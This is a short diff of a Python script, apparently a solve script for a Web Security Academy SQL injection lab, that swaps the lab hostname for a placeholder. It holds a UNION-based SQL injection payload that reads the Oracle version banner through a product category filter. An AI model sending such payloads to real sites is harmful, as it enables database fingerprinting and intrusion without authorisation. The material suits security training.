@@ -1,7 +1,7 @@
 import requests
 
 pathname="/filter?category=Accessories"
-host="0a6700650482b9c980f726340064009d.web-security-academy.net"
+host="YOUR_HOST"
 
 payload="' union select banner,null from v$version -- -"
 
